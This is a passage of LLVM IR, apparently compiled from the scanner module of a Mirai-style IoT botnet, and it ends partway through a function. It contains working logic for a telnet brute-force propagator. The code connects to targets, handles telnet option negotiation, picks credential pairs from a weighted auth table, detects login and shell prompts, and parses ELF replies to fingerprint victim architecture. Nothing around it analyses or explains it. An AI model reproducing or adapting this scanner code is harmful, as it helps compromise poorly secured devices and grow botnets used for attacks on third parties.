  br label %58

; <label>:17:                                     ; preds = %6
  %18 = shl nuw nsw i32 %8, 8
  %19 = or i32 %18, %9
  br label %58

; <label>:20:                                     ; preds = %6
  %21 = shl nuw nsw i32 %8, 8
  %22 = or i32 %21, %9
  br label %58

; <label>:23:                                     ; preds = %6
  %24 = shl nuw nsw i32 %7, 16
  %25 = shl nuw nsw i32 %8, 8
  %26 = or i32 %25, %24
  %27 = or i32 %26, %9
  br label %58

; <label>:28:                                     ; preds = %6
  %29 = shl nuw nsw i32 %7, 16
  %30 = shl nuw nsw i32 %8, 8
  %31 = or i32 %30, %29
  %32 = or i32 %31, %9
  br label %58

; <label>:33:                                     ; preds = %6
  %34 = shl nuw nsw i32 %7, 16
  %35 = shl nuw nsw i32 %8, 8
  %36 = or i32 %35, %34
  %37 = or i32 %36, %9
  br label %58

; <label>:38:                                     ; preds = %6
  %39 = or i32 %11, 1
  %trunc51 = trunc i32 %39 to i6
  switch i6 %trunc51, label %52 [
    i6 7, label %40
    i6 11, label %43
    i6 13, label %46
    i6 9, label %49
  ]

; <label>:40:                                     ; preds = %38
  %41 = shl nuw nsw i32 %8, 8
  %42 = or i32 %41, %9
  br label %58

; <label>:43:                                     ; preds = %38
  %44 = shl nuw nsw i32 %8, 8
  %45 = or i32 %44, %9
  br label %58

; <label>:46:                                     ; preds = %38
  %47 = shl nuw nsw i32 %8, 8
  %48 = or i32 %47, %9
  br label %58

; <label>:49:                                     ; preds = %38
  %50 = shl nuw nsw i32 %8, 8
  %51 = or i32 %50, %9
  br label %58

; <label>:52:                                     ; preds = %38
  %53 = shl nuw i32 %2, 24
  %54 = shl nuw nsw i32 %7, 16
  %55 = or i32 %54, %53
  %56 = shl nuw nsw i32 %8, 8
  %57 = or i32 %55, %56
  br label %58

; <label>:58:                                     ; preds = %52, %49, %46, %43, %40, %33, %28, %23, %20, %17, %12
  %.sink49 = phi i32 [ %9, %52 ], [ 453443584, %49 ], [ -875298816, %46 ], [ 1935802368, %43 ], [ 1022558208, %40 ], [ -1325400064, %33 ], [ -1174405120, %28 ], [ 1946157056, %23 ], [ 2006843392, %20 ], [ 2006777856, %17 ], [ 1996488704, %12 ]
  %.sink48 = phi i32 [ %57, %52 ], [ %51, %49 ], [ %48, %46 ], [ %45, %43 ], [ %42, %40 ], [ %37, %33 ], [ %32, %28 ], [ %27, %23 ], [ %22, %20 ], [ %19, %17 ], [ %16, %12 ]
  %59 = or i32 %.sink48, %.sink49
  %60 = tail call i32 @htonl(i32 %59) #11
  ret i32 %60
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @setup_connection(%struct.scanner_connection* nocapture) unnamed_addr #3 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #9
  store i32 -1, i32* %4, align 8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %32, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  store i32 0, i32* %13, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  tail call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 8192, i32 4, i1 false)
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #9
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #9
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 15
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 13
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @fake_time, align 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 3
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 16
  store i32 1, i32* %28, align 8
  %29 = load i32, i32* %4, align 8
  %30 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* nonnull %30, i32 16) #9
  br label %32

; <label>:32:                                     ; preds = %9, %12
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection* nocapture, i32) local_unnamed_addr #3 {
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 0
  store i32 0, i32* %4, align 8
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 12
  store i8 0, i8* %5, align 1
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 17, i32 4, i1 false)
  store i32 -1, i32* %6, align 4
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %7, align 4
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  store i32 0, i32* %8, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %10 = load i32, i32* %9, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %14, label %12

; <label>:12:                                     ; preds = %2
  %13 = tail call i32 @close(i32 %10) #9
  br label %14

; <label>:14:                                     ; preds = %2, %12
  store i32 -1, i32* %9, align 8
  %15 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 16
  store i32 0, i32* %15, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc %struct.scanner_auth* @random_auth_entry() unnamed_addr #3 {
  %1 = tail call i32 @rand_next() #9
  %2 = load i16, i16* @auth_table_max_weight, align 2
  %3 = zext i16 %2 to i32
  %4 = urem i32 %1, %3
  %5 = load i32, i32* @auth_table_len, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %0
  %7 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %8 = load i32, i32* @auth_table_len, align 4
  %9 = sext i32 %8 to i64
  br label %10

; <label>:10:                                     ; preds = %.lr.ph, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %20 ]
  %11 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv, i32 2
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = icmp ult i32 %4, %13
  br i1 %14, label %20, label %15

; <label>:15:                                     ; preds = %10
  %16 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv, i32 3
  %17 = load i16, i16* %16, align 2
  %18 = zext i16 %17 to i32
  %19 = icmp ult i32 %4, %18
  br i1 %19, label %._crit_edge9, label %20

; <label>:20:                                     ; preds = %15, %10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %9
  br i1 %21, label %10, label %._crit_edge.loopexit

._crit_edge9:                                     ; preds = %15
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %20
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge9, %0
  %.0 = phi %struct.scanner_auth* [ %22, %._crit_edge9 ], [ null, %0 ], [ null, %._crit_edge.loopexit ]
  ret %struct.scanner_auth* %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #3 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #9
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %9 = add nsw i64 %wide.trip.count, -1
  %xtraiter = and i64 %6, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %14, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %14 ], [ 0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %14 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %10 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i8 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %.lr.ph.prol
  store i8 65, i8* %10, align 1
  br label %14

; <label>:14:                                     ; preds = %13, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !5

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %14
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %15 = icmp ult i64 %9, 3
  br i1 %15, label %.loopexit.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %32, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.3, %32 ]
  %16 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %19, label %.lr.ph.113

; <label>:19:                                     ; preds = %.lr.ph
  store i8 65, i8* %16, align 1
  br label %.lr.ph.113

.lr.ph.113:                                       ; preds = %.lr.ph, %19
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %21 = load i8, i8* %20, align 1
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %23, label %.lr.ph.214

.loopexit.loopexit.unr-lcssa:                     ; preds = %32
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4
  ret i32 %7

; <label>:23:                                     ; preds = %.lr.ph.113
  store i8 65, i8* %20, align 1
  br label %.lr.ph.214

.lr.ph.214:                                       ; preds = %23, %.lr.ph.113
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %24 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %25 = load i8, i8* %24, align 1
  %26 = icmp eq i8 %25, 0
  br i1 %26, label %27, label %.lr.ph.315

; <label>:27:                                     ; preds = %.lr.ph.214
  store i8 65, i8* %24, align 1
  br label %.lr.ph.315

.lr.ph.315:                                       ; preds = %27, %.lr.ph.214
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %28 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %.lr.ph.315
  store i8 65, i8* %28, align 1
  br label %32

; <label>:32:                                     ; preds = %31, %.lr.ph.315
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_iacs(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  br label %12

; <label>:12:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %13 = load i8, i8* %.03135, align 1
  %14 = icmp eq i8 %13, -1
  br i1 %14, label %15, label %._crit_edge.loopexit

; <label>:15:                                     ; preds = %12
  %16 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %17 = icmp eq i8 %16, 0
  br i1 %17, label %._crit_edge.loopexit, label %18

; <label>:18:                                     ; preds = %15
  %19 = getelementptr inbounds i8, i8* %.03135, i64 1
  %20 = load i8, i8* %19, align 1
  switch i8 %20, label %40 [
    i8 -1, label %21
    i8 -3, label %26
  ]

; <label>:21:                                     ; preds = %18
  %22 = getelementptr inbounds i8, i8* %.03135, i64 2
  %23 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %21, %33, %51
  %.032.be = phi i32 [ %23, %21 ], [ %55, %51 ], [ %35, %33 ]
  %.031.be = phi i8* [ %22, %21 ], [ %54, %51 ], [ %34, %33 ]
  %24 = load i32, i32* %5, align 8
  %25 = icmp slt i32 %.032.be, %24
  br i1 %25, label %12, label %._crit_edge.loopexit

; <label>:26:                                     ; preds = %18
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %27 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %28 = icmp eq i8 %27, 0
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds i8, i8* %.03135, i64 2
  %31 = load i8, i8* %30, align 1
  %32 = icmp eq i8 %31, 31
  br i1 %32, label %33, label %40

; <label>:33:                                     ; preds = %29
  %34 = getelementptr inbounds i8, i8* %.03135, i64 3
  %35 = add nsw i32 %.03234, 3
  %36 = load i32, i32* %11, align 8
  %37 = call i64 @send(i32 %36, i8* nonnull %4, i64 3, i32 16384) #9
  %38 = load i32, i32* %11, align 8
  %39 = call i64 @send(i32 %38, i8* nonnull %10, i64 9, i32 16384) #9
  br label %.backedge

; <label>:40:                                     ; preds = %18, %29
  %41 = call fastcc signext i8 @can_consume(%struct.scanner_connection* %0, i8* nonnull %.03135, i32 2)
  %42 = icmp eq i8 %41, 0
  br i1 %42, label %._crit_edge.loopexit, label %.preheader

.preheader:                                       ; preds = %40
  %43 = load i8, i8* %.03135, align 1
  switch i8 %43, label %.preheader.144 [
    i8 -3, label %44
    i8 -5, label %.sink.split
  ]

; <label>:44:                                     ; preds = %.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader, %44
  %.sink = phi i8 [ -4, %44 ], [ -3, %.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader, %.sink.split
  %45 = getelementptr inbounds i8, i8* %.03135, i64 1
  %46 = load i8, i8* %45, align 1
  switch i8 %46, label %.preheader.245 [
    i8 -3, label %47
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %26, %40, %15, %12, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %26 ], [ %.03234, %40 ], [ %.03234, %15 ], [ %.03234, %12 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:47:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %47, %.preheader.144
  %.sink.1 = phi i8 [ -4, %47 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %45, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %48 = getelementptr inbounds i8, i8* %.03135, i64 2
  %49 = load i8, i8* %48, align 1
  switch i8 %49, label %51 [
    i8 -3, label %50
    i8 -5, label %.sink.split.2
  ]

; <label>:50:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %50, %.preheader.245
  %.sink.2 = phi i8 [ -4, %50 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %48, align 1
  br label %51

; <label>:51:                                     ; preds = %.sink.split.2, %.preheader.245
  %52 = load i32, i32* %9, align 8
  %53 = call i64 @send(i32 %52, i8* nonnull %.03135, i64 3, i32 16384) #9
  %54 = getelementptr inbounds i8, i8* %.03135, i64 3
  %55 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_login_prompt(%struct.scanner_connection*, i32) unnamed_addr #3 {
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %4 = load i32, i32* %3, align 8
  %5 = icmp eq i32 %1, 1
  %6 = sext i32 %4 to i64
  br label %7

; <label>:7:                                      ; preds = %12, %2
  %indvars.iv = phi i64 [ %indvars.iv.next, %12 ], [ %6, %2 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %8 = icmp sgt i64 %indvars.iv, 1
  br i1 %8, label %9, label %14

; <label>:9:                                      ; preds = %7
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %11 = load i8, i8* %10, align 1
  switch i8 %11, label %12 [
    i8 58, label %.thread.loopexit
    i8 62, label %.thread.loopexit
    i8 36, label %.thread.loopexit
    i8 35, label %.thread.loopexit
  ]

; <label>:12:                                     ; preds = %9
  %13 = icmp eq i8 %11, 37
  %or.cond = and i1 %5, %13
  br i1 %or.cond, label %.thread.loopexit, label %7

; <label>:14:                                     ; preds = %7
  %15 = icmp eq i32 %1, 1
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %17 = load i32, i32* %3, align 8
  br i1 %15, label %18, label %28

; <label>:18:                                     ; preds = %14
  %19 = tail call i32 @util_memsearch(i8* %16, i32 %17, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i64 0, i64 0), i32 4) #9
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %.thread

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* %3, align 8
  %23 = tail call i32 @util_memsearch(i8* %16, i32 %22, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i64 0, i64 0), i32 5) #9
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %.thread

; <label>:25:                                     ; preds = %21
  %26 = load i32, i32* %3, align 8
  %27 = tail call i32 @util_memsearch(i8* nonnull %16, i32 %26, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i64 0, i64 0), i32 3) #9
  br label %.thread

; <label>:28:                                     ; preds = %14
  %29 = tail call i32 @util_memsearch(i8* %16, i32 %17, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i64 0, i64 0), i32 7) #9
  br label %.thread

.thread.loopexit:                                 ; preds = %9, %9, %9, %9, %12
  %30 = trunc i64 %indvars.iv to i32
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %28, %25, %21, %18
  %.1 = phi i32 [ %19, %18 ], [ %23, %21 ], [ %27, %25 ], [ %29, %28 ], [ %30, %.thread.loopexit ]
  %31 = icmp eq i32 %.1, -1
  %..1 = select i1 %31, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8* nocapture readonly, ...) local_unnamed_addr #3 {
  %3 = alloca [5026 x i8], align 16
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = getelementptr inbounds [5026 x i8], [5026 x i8]* %3, i64 0, i64 0
  %8 = call i32 @vsprintf(i8* nonnull %7, i8* %1, %struct.__va_list_tag* nonnull %5) #9
  call void @llvm.va_end(i8* nonnull %6)
  %9 = sext i32 %8 to i64
  %10 = call i64 @send(i32 %0, i8* nonnull %7, i64 %9, i32 16384) #9
  %11 = icmp eq i64 %10, %9
  br i1 %11, label %12, label %14

; <label>:12:                                     ; preds = %2
  %13 = call i64 @send(i32 %0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #9
  br label %14

; <label>:14:                                     ; preds = %2, %12
  %.0 = phi i32 [ 1, %12 ], [ 0, %2 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_shell_prompt(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %4 = load i32, i32* %3, align 8
  %5 = tail call i32 @util_memsearch(i8* %2, i32 %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i64 0, i64 0), i32 8) #9
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %35

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 8
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %8, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i64 0, i64 0), i32 6) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %35

; <label>:11:                                     ; preds = %7
  %12 = load i32, i32* %3, align 8
  %13 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %12, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i64 0, i64 0), i32 9) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %35

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* %3, align 8
  %17 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %16, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i64 0, i64 0), i32 14) #9
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %35

; <label>:19:                                     ; preds = %15
  %20 = load i32, i32* %3, align 8
  %21 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i64 0, i64 0), i32 5) #9
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %35

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %3, align 8
  %25 = sext i32 %24 to i64
  br label %26

; <label>:26:                                     ; preds = %28, %23
  %indvars.iv = phi i64 [ %indvars.iv.next, %28 ], [ %25, %23 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %27 = icmp sgt i64 %indvars.iv, 1
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %26
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %30 = load i8, i8* %29, align 1
  %31 = trunc i64 %indvars.iv to i32
  switch i8 %30, label %26 [
    i8 58, label %32
    i8 62, label %32
    i8 36, label %32
    i8 35, label %32
    i8 37, label %32
    i8 93, label %32
    i8 126, label %32
  ]

; <label>:32:                                     ; preds = %28, %28, %28, %28, %28, %28, %28, %26
  %.0 = phi i32 [ -1, %26 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ]
  %33 = icmp eq i32 %.0, 0
  %..0 = select i1 %33, i32 1, i32 %.0
  %34 = icmp eq i32 %..0, -1
  %...0 = select i1 %34, i32 0, i32 %..0
  ret i32 %...0

; <label>:35:                                     ; preds = %19, %15, %11, %7, %1
  ret i32 -1
}

declare void @table_unlock_val(i8 zeroext) local_unnamed_addr #2

declare i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #2

declare void @table_lock_val(i8 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_resp_prompt(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  %10 = icmp eq i32 %9, -1
  call void @table_lock_val(i8 zeroext 12) #9
  %. = select i1 %10, i32 0, i32 %9
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @parse_elf_response(%struct.scanner_connection*) unnamed_addr #3 {
  br label %2

; <label>:2:                                      ; preds = %71, %1
  %indvars.iv = phi i64 [ 0, %1 ], [ %indvars.iv.next.1, %71 ]
  %.03639 = phi i32 [ 0, %1 ], [ %.1.1, %71 ]
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv
  %4 = load i8, i8* %3, align 1
  %5 = sext i32 %.03639 to i64
  %6 = getelementptr inbounds [5 x i8], [5 x i8]* @.str.131, i64 0, i64 %5
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %4, %7
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %2
  %10 = add nsw i32 %.03639, 1
  %11 = icmp eq i32 %10, 4
  %12 = trunc i64 %indvars.iv to i32
  br i1 %11, label %20, label %13

; <label>:13:                                     ; preds = %2, %9
  %.1 = phi i32 [ %10, %9 ], [ 0, %2 ]
  %indvars.iv.next = or i64 %indvars.iv, 1
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %15 = load i8, i8* %14, align 1
  %16 = sext i32 %.1 to i64
